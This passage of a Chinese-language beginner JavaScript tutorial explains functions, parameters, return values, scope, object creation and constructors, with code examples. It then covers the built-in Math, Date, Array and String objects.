<p>数组中可以通过以下方式在数组的末尾插入新元素：</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript">数组<span class="token punctuation">[</span> 数组<span class="token punctuation">.</span>length <span class="token punctuation">]</span> <span class="token operator">=</span> 新数据<span class="token punctuation">;</span></code></pre>
<h3 id="函数">函数</h3>
<h4 id="函数的概念">函数的概念</h4>
<p>在 JS 里面，可能会定义非常多的相同代码或者功能相似的代码，这些代码可能需要大量重复使用。虽然 for循环语句也能实现一些简单的重复操作，但是比较具有局限性，此时我们就可以使用 JS 中的函数。</p>
<p>函数：就是<strong>封装了一段可被重复调用执行的代码块</strong>。通过此代码块可以<strong>实现大量代码的重复使用</strong>。</p>
<h4 id="函数的使用">函数的使用</h4>
<h5 id="声明函数">声明函数</h5>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 声明函数</span>
<span class="token keyword">function</span> <span class="token function">函数名</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">//函数体代码</span>
<span class="token punctuation">&#125;</span></code></pre>
<ul>
<li>
<p>function 是声明函数的关键字,必须小写</p>
</li>
<li>
<p>由于函数一般是为了实现某个功能才定义的， 所以通常我们将函数名命名为动词，比如 getSum</p>
</li>
</ul>
<h5 id="调用函数">调用函数</h5>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 调用函数</span>
<span class="token function">函数名</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 通过调用函数名来执行函数体代码</span></code></pre>
<ul>
<li>
<p>调用的时候千万不要忘记添加小括号</p>
</li>
<li>
<p>口诀：函数不调用，自己不执行</p>
<p>注意：声明函数本身并不会执行代码，只有调用函数时才会执行函数体代码。</p>
</li>
</ul>
<p>例子：封装计算1-100累加和</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/* 
   计算1-100之间值的函数
*/</span>
<span class="token comment">// 声明函数</span>
<span class="token keyword">function</span> <span class="token function">getSum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">var</span> sumNum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">// 准备一个变量，保存数字和</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    sumNum <span class="token operator">+=</span> i<span class="token punctuation">;</span><span class="token comment">// 把每个数值 都累加 到变量中</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">alert</span><span class="token punctuation">(</span>sumNum<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// 调用函数</span>
<span class="token function">getSum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<h4 id="函数的参数">函数的参数</h4>
<h5 id="函数参数语法">函数参数语法</h5>
<ul>
<li>
<p>形参：函数定义时设置接收调用时传入</p>
</li>
<li>
<p>实参：函数调用时传入小括号内的真实数据</p>
<p><img src="https://s2.loli.net/2022/01/25/8EAVZwUidC3cjgN.png" alt=""></p>
<p>参数的作用 : 在函数内部某些值不能固定，我们可以通过参数在调用函数时传递不同的值进去。</p>
<p>函数参数的运用：</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 带参数的函数声明</span>
<span class="token keyword">function</span> <span class="token function">函数名</span><span class="token punctuation">(</span><span class="token parameter">形参<span class="token number">1</span><span class="token punctuation">,</span> 形参<span class="token number">2</span> <span class="token punctuation">,</span> 形参<span class="token number">3.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 可以定义任意多的参数，用逗号分隔</span>
  <span class="token comment">// 函数体</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// 带参数的函数调用</span>
<span class="token function">函数名</span><span class="token punctuation">(</span>实参<span class="token number">1</span><span class="token punctuation">,</span> 实参<span class="token number">2</span><span class="token punctuation">,</span> 实参<span class="token number">3.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre>
<ol>
<li>调用的时候实参值是传递给形参的</li>
<li>形参简单理解为：不用声明的变量</li>
<li>实参和形参的多个参数之间用逗号（,）分隔</li>
</ol>
</li>
</ul>
<h5 id="函数形参和实参数量不匹配时">函数形参和实参数量不匹配时</h5>
<p><img src="https://s2.loli.net/2022/01/25/qeJQoI5WSLu9PBm.png" alt=""></p>
<p>注意：在JavaScript中，形参的默认值是undefined。</p>
<p>小结：</p>
<ul>
<li>函数可以带参数也可以不带参数</li>
<li>声明函数的时候，函数名括号里面的是形参，形参的默认值为 undefined</li>
<li>调用函数的时候，函数名括号里面的是实参</li>
<li>多个参数中间用逗号分隔</li>
<li>形参的个数可以和实参个数不匹配，但是结果不可预计，我们尽量要匹配</li>
</ul>
<h4 id="函数的返回值">函数的返回值</h4>
<h5 id="return-语句">return 语句</h5>
<p>返回值：函数调用整体代表的数据；函数执行完成后可以通过return语句将指定数据返回 。</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 声明函数</span>
<span class="token keyword">function</span> 函数名（）<span class="token punctuation">&#123;</span>
    <span class="token operator">...</span>
    <span class="token keyword">return</span>  需要返回的值；
<span class="token punctuation">&#125;</span>
<span class="token comment">// 调用函数</span>
<span class="token function">函数名</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 此时调用函数就可以得到函数体内return 后面的值</span></code></pre>
<ul>
<li>在使用 return 语句时，函数会停止执行，并返回指定的值</li>
<li>如果函数没有 return ，返回的值是 undefined</li>
</ul>
<h5 id="break-continue-return-的区别">break ,continue ,return 的区别</h5>
<ul>
<li>break ：结束当前的循环体（如 for、while）</li>
<li>continue ：跳出本次循环，继续执行下次循环（如 for、while）</li>
<li>return ：不仅可以退出循环，还能够返回 return 语句中的值，同时还可以结束当前的函数体内的代码</li>
</ul>
<h4 id="arguments的使用">arguments的使用</h4>
<p>当不确定有多少个参数传递的时候，可以用 arguments 来获取。JavaScript 中，arguments实际上它是当前函数的一个内置对象。所有函数都内置了一个 arguments 对象，arguments 对象中存储了传递的所有实参。arguments展示形式是一个伪数组，因此可以进行遍历。伪数组具有以下特点：</p>
<ul>
<li>
<p>具有 length 属性</p>
</li>
<li>
<p>按索引方式储存数据</p>
</li>
<li>
<p>不具有数组的 push , pop 等方法</p>
<p>注意：在函数内部使用该对象，用此对象获取函数调用时传的实参。</p>
</li>
</ul>
<h4 id="函数案例">函数案例</h4>
<p>​	函数内部可以调用另一个函数，在同一作用域代码中，函数名即代表封装的操作，使用函数名加括号即可以将封装的操作执行。</p>
<h4 id="函数的两种声明方式">函数的两种声明方式</h4>
<ul>
<li>
<p>自定义函数方式(命名函数)</p>
<p>利用函数关键字 function 自定义函数方式</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 声明定义方式</span>
<span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token operator">...</span><span class="token punctuation">&#125;</span>
<span class="token comment">// 调用  </span>
<span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </code></pre>
<ul>
<li>因为有名字，所以也被称为命名函数</li>
<li>调用函数的代码既可以放到声明函数的前面，也可以放在声明函数的后面</li>
</ul>
</li>
<li>
<p>函数表达式方式(匿名函数）</p>
<p>利用函数表达式方式的写法如下：</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 这是函数表达式写法，匿名函数后面跟分号结束</span>
<span class="token keyword">var</span> <span class="token function-variable function">fn</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">...</span><span class="token punctuation">&#125;</span>；
<span class="token comment">// 调用的方式，函数调用必须写到函数体下面</span>
<span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<ul>
<li>因为函数没有名字，所以也被称为匿名函数</li>
<li>这个fn 里面存储的是一个函数</li>
<li>函数表达式方式原理跟声明变量方式是一致的</li>
<li>函数调用的代码必须写到函数体后面</li>
</ul>
</li>
</ul>
<h2 id="作用域">作用域</h2>
<h4 id="JS没有块级作用域">JS没有块级作用域</h4>
<ul>
<li>
<p>块作用域由 { } 包括。</p>
</li>
<li>
<p>在其他编程语言中（如 java、c#等），在 if 语句、循环语句中创建的变量，仅仅只能在本 if 语句、本循环语句中使用，如下面的Java代码：</p>
<p>python 有块级作用域：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    num <span class="token operator">=</span> <span class="token number">123</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>  <span class="token comment"># 123</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>  <span class="token comment"># 报错</span></code></pre>
<p>以上java代码会报错，是因为代码中 { } 即一块作用域，其中声明的变量 num，在 “{ }” 之外不能使用；</p>
<p>而与之类似的JavaScript代码，则不会报错：</p>
<p>Js中没有块级作用域（在ES6之前）</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">var</span> num <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//123</span>
<span class="token punctuation">&#125;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//123</span></code></pre>
</li>
</ul>
<h3 id="对象">对象</h3>
<h4 id="创建对象的三种方式">创建对象的三种方式</h4>
<h5 id="使用对象字面量创建对象："><strong>使用对象字面量创建对象</strong>：</h5>
<p>就是花括号 { } 里面包含了表达这个具体事物（对象）的属性和方法；{ } 里面采取键值对的形式表示</p>
<ul>
<li>
<p>键：相当于属性名</p>
</li>
<li>
<p>值：相当于属性值，可以是任意类型的值（数字类型、字符串类型、布尔类型，函数类型等）</p>
<p>代码如下：</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> star <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    name <span class="token operator">:</span> <span class="token string">'Asuna'</span><span class="token punctuation">,</span>
    age <span class="token operator">:</span> <span class="token number">15</span><span class="token punctuation">,</span>
    sex <span class="token operator">:</span> <span class="token string">'女'</span><span class="token punctuation">,</span>
    <span class="token function-variable function">sayHi</span> <span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'大家好啊~'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>
<p>上述代码中 star即是创建的对象。</p>
</li>
</ul>
<h5 id="对象的使用">对象的使用</h5>
<ul>
<li>
<p>对象的属性</p>
<ul>
<li>对象中存储<strong>具体数据</strong>的 &quot;键值对&quot;中的 &quot;键&quot;称为对象的属性，即对象中存储具体数据的项</li>
</ul>
</li>
<li>
<p>对象的方法</p>
<ul>
<li>对象中存储<strong>函数</strong>的 &quot;键值对&quot;中的 &quot;键&quot;称为对象的方法，即对象中存储函数的项</li>
</ul>
</li>
<li>
<p>访问对象的属性</p>
<ul>
<li>
<p>对象里面的属性调用 : 对象.属性名 ，这个小点 . 就理解为“ 的 ”</p>
</li>
<li>
<p>对象里面属性的另一种调用方式 : 对象[‘属性名’]，注意方括号里面的属性必须加引号</p>
<p>示例代码如下：</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>star<span class="token punctuation">.</span>name<span class="token punctuation">)</span>     <span class="token comment">// 调用名字属性</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>star<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment">// 调用名字属性</span></code></pre>
</li>
</ul>
</li>
<li>
<p>调用对象的方法</p>
<ul>
<li>
<p>对象里面的方法调用：对象.方法名() ，注意这个方法名字后面一定加括号</p>
<p>示例代码如下：</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript">star<span class="token punctuation">.</span><span class="token function">sayHi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment">// 调用 sayHi 方法,注意，一定不要忘记带后面的括号</span></code></pre>
</li>
</ul>
</li>
<li>
<p>变量、属性、函数、方法总结</p>
<p>属性是对象的一部分，而变量不是对象的一部分，变量是单独存储数据的容器</p>
<ul>
<li>变量：单独声明赋值，单独存在</li>
<li>属性：对象里面的变量称为属性，不需要声明，用来描述该对象的特征</li>
</ul>
</li>
</ul>
<ul>
<li>方法是对象的一部分，函数不是对象的一部分，函数是单独封装操作的容器
<ul>
<li>函数：单独存在的，通过“函数名()”的方式就可以调用</li>
<li>方法：对象里面的函数称为方法，方法不需要声明，使用“对象.方法名()”的方式就可以调用，方法用来描述该对象的行为和功能。</li>
</ul>
</li>
</ul>
<h5 id="利用-new-Object-创建对象">利用 new Object 创建对象</h5>
<ul>
<li>
<p>创建空对象</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> andy <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Obect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>通过内置构造函数Object创建对象，此时andy变量已经保存了创建出来的空对象</p>
</li>
<li>
<p>给空对象添加属性和方法</p>
<ul>
<li>
<p>通过对象操作属性和方法的方式，来为对象增加属性和方法</p>
<p>示例代码如下：</p>
</li>
</ul>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript">andy<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'Asuna'</span><span class="token punctuation">;</span>
andy<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">15</span><span class="token punctuation">;</span>
andy<span class="token punctuation">.</span>sex <span class="token operator">=</span> <span class="token string">'女'</span><span class="token punctuation">;</span>
andy<span class="token punctuation">.</span><span class="token function-variable function">sayHi</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'大家好啊~'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>注意：</p>
<ul>
<li>Object() ：第一个字母大写</li>
<li>new Object() ：需要 new 关键字</li>
<li>使用的格式：对象.属性 =  值;</li>
</ul>
</li>
</ul>
<h5 id="利用构造函数创建对象">利用构造函数创建对象</h5>
<p><strong>构造函数</strong></p>
<ul>
<li>
<p>构造函数：是一种特殊的函数，主要用来初始化对象，即为对象成员变量赋初始值，它总与 new 运算符一起使用。我们可以把对象中一些公共的属性和方法抽取出来，然后封装到这个函数里面。</p>
</li>
<li>
<p>构造函数的封装格式：</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">构造函数名</span><span class="token punctuation">(</span><span class="token parameter">形参<span class="token number">1</span><span class="token punctuation">,</span>形参<span class="token number">2</span><span class="token punctuation">,</span>形参<span class="token number">3</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
     <span class="token keyword">this</span><span class="token punctuation">.</span>属性名<span class="token number">1</span> <span class="token operator">=</span> 参数<span class="token number">1</span><span class="token punctuation">;</span>
     <span class="token keyword">this</span><span class="token punctuation">.</span>属性名<span class="token number">2</span> <span class="token operator">=</span> 参数<span class="token number">2</span><span class="token punctuation">;</span>
     <span class="token keyword">this</span><span class="token punctuation">.</span>属性名<span class="token number">3</span> <span class="token operator">=</span> 参数<span class="token number">3</span><span class="token punctuation">;</span>
     <span class="token keyword">this</span><span class="token punctuation">.</span>方法名 <span class="token operator">=</span> 函数体<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
</li>
<li>
<p>构造函数的调用格式</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">构造函数名</span><span class="token punctuation">(</span>实参<span class="token number">1</span>，实参<span class="token number">2</span>，实参<span class="token number">3</span><span class="token punctuation">)</span></code></pre>
<p>以上代码中，obj即接收到构造函数创建出来的对象。</p>
</li>
<li>
<p>注意事项</p>
<ol>
<li>构造函数约定<strong>首字母大写</strong>。</li>
<li>函数内的属性和方法前面需要添加 <strong>this</strong> ，表示当前对象的属性和方法。</li>
<li>构造函数中<strong>不需要 return 返回结果</strong>。</li>
<li>当我们创建对象的时候，<strong>必须用 new 来调用构造函数</strong>。</li>
</ol>
</li>
<li>
<p>其他</p>
<p>构造函数，如 Stars()，抽象了对象的公共部分，封装到了函数里面，它泛指某一大类（class）<br>
创建对象，如 new Stars()，特指某一个，通过 new 关键字创建对象的过程我们也称为对象实例化</p>
</li>
</ul>
<h4 id="new关键字的作用">new关键字的作用</h4>
<ol>
<li>在构造函数代码开始执行之前，创建一个空对象；</li>
<li>修改this的指向，把this指向创建出来的空对象；</li>
<li>执行函数的代码</li>
<li>在函数完成之后，返回this—即创建出来的对象</li>
</ol>
<h4 id="遍历对象">遍历对象</h4>
<p>for… in 语句用于对数组或者对象的属性进行循环操作。</p>
<p>其语法如下：</p>
  <pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">for</span> <span class="token punctuation">(</span>变量 <span class="token keyword">in</span> 对象名字<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 在此执行代码</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>语法中的变量是自定义的，它需要符合命名规范，通常我们会将这个变量写为 k 或者 key。</p>
  <pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> k <span class="token keyword">in</span> obj<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 这里的 k 是属性名</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 这里的 obj[k] 是属性值</span>
<span class="token punctuation">&#125;</span></code></pre>
<h2 id="内置对象">内置对象</h2>
<h3 id="内置对象-2">内置对象</h3>
<h4 id="内置对象-3">内置对象</h4>
<p>JavaScript 中的对象分为3种：<strong>自定义对象 、内置对象、 浏览器对象</strong><br>
前面两种对象是JS 基础 内容，属于 ECMAScript；  第三个浏览器对象属于 JS 独有的， JS API 讲解内置对象就是指 JS 语言自带的一些对象，这些对象供开发者使用，并提供了一些常用的或是<strong>最基本而必要的功能</strong>（属性和方法），内置对象最大的优点就是帮助我们快速开发</p>
<p>JavaScript 提供了多个内置对象：Math、 Date 、Array、String等</p>
<h4 id="查文档">查文档</h4>
<p>查找文档：学习一个内置对象的使用，只要学会其常用成员的使用即可，我们可以通过查文档学习，可以通过MDN/W3C来查询。<br>
Mozilla 开发者网络（MDN）提供了有关开放网络技术（Open Web）的信息，包括 HTML、CSS 和万维网及 HTML5 应用的 API。<br>
MDN:<a href="https://developer.mozilla.org/zh-CN/">https://developer.mozilla.org/zh-CN/</a></p>
<h4 id="Math对象">Math对象</h4>
<p>Math 对象不是构造函数，它具有数学常数和函数的属性和方法。跟数学相关的运算（求绝对值，取整、最大值等）可以使用 Math 中的成员。</p>
<table>
<thead>
<tr>
<th>属性、方法名</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td>Math.PI</td>
<td>圆周率</td>
</tr>
<tr>
<td>Math.floor()</td>
<td>向下取整</td>
</tr>
<tr>
<td>Math.ceil()</td>
<td>向上取整</td>
</tr>
<tr>
<td>Math.round()</td>
<td>四舍五入版 就近取整   注意 -3.5   结果是  -3</td>
</tr>
<tr>
<td>Math.abs()</td>
<td>绝对值</td>
</tr>
<tr>
<td>Math.max()/Math.min()</td>
<td>求最大和最小值</td>
</tr>
<tr>
<td>Math.random()</td>
<td>获取范围在[0,1)内的随机值</td>
</tr>
</tbody>
</table>
<p>注意：上面的方法使用时必须带括号</p>
<p><strong>获取指定范围内的随机整数</strong>：</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">getRandom</span><span class="token punctuation">(</span><span class="token parameter">min<span class="token punctuation">,</span> max</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>max <span class="token operator">-</span> min <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> min<span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span></code></pre>
<h4 id="日期对象">日期对象</h4>
<p>Date 对象和 Math 对象不一样，Date是一个构造函数，所以使用时需要实例化后才能使用其中具体方法和属性。Date 实例用来处理日期和时间</p>
<ul>
<li>
<p>使用Date实例化日期对象</p>
<ul>
<li>获取当前时间必须实例化：</li>
</ul>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> now <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<ul>
<li>获取指定时间的日期对象</li>
</ul>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> future <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token string">'2019/5/1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>注意：如果创建实例时并未传入参数，则得到的日期对象是当前时间对应的日期对象</p>
</li>
<li>
<p>使用Date实例的方法和属性</p>
<p><img src="https://s2.loli.net/2022/01/25/4i2l3gOeSNCZt7d.png" alt=""></p>
</li>
<li>
<p>通过Date实例获取总毫米数</p>
<ul>
<li>
<p>总毫秒数的含义</p>
<p>​	基于1970年1月1日（世界标准时间）起的毫秒数</p>
</li>
<li>
<p>获取总毫秒数</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 实例化Date对象</span>
<span class="token keyword">var</span> now <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 1. 用于获取对象的原始值</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>date<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>	
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>date<span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>	
<span class="token comment">// 2. 简单写可以这么做</span>
<span class="token keyword">var</span> now <span class="token operator">=</span> <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>			
<span class="token comment">// 3. HTML5中提供的方法，有兼容性问题</span>
<span class="token keyword">var</span> now <span class="token operator">=</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
</li>
</ul>
</li>
</ul>
<h4 id="数组对象">数组对象</h4>
<h5 id="添加删除数组元素的方法">添加删除数组元素的方法</h5>
<ul>
<li>
<p>数组中有进行增加、删除元素的方法，部分方法如下表</p>
<p><img src="https://s2.loli.net/2022/01/25/cbp4GCLmfTuHF6D.png" alt=""></p>
<p>注意：push、unshift为增加元素方法；pop、shift为删除元素的方法</p>
</li>
</ul>
<h5 id="数组转换为字符串">数组转换为字符串</h5>
<ul>
<li>
<p>数组中有把数组转化为字符串的方法，部分方法如下表</p>
<p><img src="https://s2.loli.net/2022/01/25/ALomgf9Z6I7BdJ8.png" alt=""></p>
<p>注意：join方法如果不传入参数，则按照 “ , ”拼接元素</p>
</li>
</ul>
<h5 id="其他方法">其他方法</h5>
<ul>
<li>
<p>数组中还有其他操作方法，同学们可以在课下自行查阅学习</p>
<p><img src="https://s2.loli.net/2022/01/25/LXl6EdIye1nTCN7.png" alt=""></p>
</li>
</ul>
<h4 id="字符串对象">字符串对象</h4>
<h5 id="基本包装类型">基本包装类型</h5>
<p>为了方便操作基本数据类型，JavaScript 还提供了三个特殊的引用类型：String、Number和 Boolean。</p>
<p>基本包装类型就是把简单数据类型包装成为复杂数据类型，这样基本数据类型就有了属性和方法。</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 下面代码有什么问题？</span>
<span class="token keyword">var</span> str <span class="token operator">=</span> <span class="token string">'andy'</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>按道理基本数据类型是没有属性和方法的，而对象才有属性和方法，但上面代码却可以执行，这是因为</p>
<p>js 会把基本数据类型包装为复杂数据类型，其执行过程如下 ：</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 1. 生成临时变量，把简单类型包装为复杂数据类型</span>
<span class="token keyword">var</span> temp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token string">'andy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 2. 赋值给我们声明的字符变量</span>
str <span class="token operator">=</span> temp<span class="token punctuation">;</span>
<span class="token comment">// 3. 销毁临时变量</span>
temp <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span></code></pre>
<h5 id="字符串的不可变">字符串的不可变</h5>
<p>指的是里面的值不可变，虽然看上去可以改变内容，但其实是地址变了，内存中新开辟了一个内存空间。</p>
<p>当重新给字符串变量赋值的时候，变量之前保存的字符串不会被修改，依然在内存中重新给字符串赋值，会重新在内存中开辟空间，这个特点就是字符串的不可变。<br>
由于字符串的不可变，在<strong>大量拼接字符串</strong>的时候会有效率问题</p>
<h5 id="根据字符返回位置">根据字符返回位置</h5>
<p>字符串通过基本包装类型可以调用部分方法来操作字符串，以下是返回指定字符的位置的方法：</p>
<p><img src="https://s2.loli.net/2022/01/25/gn4Map1d6uKANxC.png" alt=""></p>
<p>​		案例：查找字符串&quot;abcoefoxyozzopp&quot;中所有o出现的位置以及次数</p>
<ol>
<li>先查找第一个o出现的位置</li>
<li>然后 只要indexOf 返回的结果不是 -1 就继续往后查找</li>
<li>因为indexOf 只能查找到第一个，所以后面的查找，利用第二个参数，当前索引加1，从而继续查找</li>
</ol>
<h5 id="根据位置返回字符">根据位置返回字符</h5>
<p>字符串通过基本包装类型可以调用部分方法来操作字符串，以下是根据位置返回指定位置上的字符：</p>
<p><img src="https://s2.loli.net/2022/01/25/1axHvLDEiOWJydp.png" alt=""></p>
<p>在上述方法中，charCodeAt方法返回的是指定位置上字符对应的ASCII码。</p>
<p>案例：判断一个字符串 ‘abcoefoxyozzopp’ 中出现次数最多的字符，并统计其次数</p>
<ol>
<li>
<p>核心算法：利用 charAt(） 遍历这个字符串</p>
</li>
<li>
<p>把每个字符都存储给对象， 如果对象没有该属性，就为1，如果存在了就 +1</p>
</li>
<li>
<p>遍历对象，得到最大值和该字符</p>
<p>注意：在遍历的过程中，把字符串中的每个字符作为对象的属性存储在对象总，对应的属性值是该字符出现的次数</p>
</li>
</ol>
<h5 id="字符串操作方法">字符串操作方法</h5>
<p>字符串通过基本包装类型可以调用部分方法来操作字符串，以下是部分操作方法：</p>
<p><img src="https://s2.loli.net/2022/01/25/QOXq1nTB4AUuL7d.png" alt=""></p>
<h5 id="replace-方法">replace()方法</h5>
<p>replace() 方法用于在字符串中用一些字符替换另一些字符，其使用格式如下：</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript">字符串<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>被替换的字符串， 要替换为的字符串<span class="token punctuation">)</span>；</code></pre>
<h5 id="split-方法">split()方法</h5>
<p>​		split()方法用于切分字符串，它可以将字符串切分为数组。在切分完毕之后，返回的是一个新数组。</p>
<p>​		其使用格式如下：</p>
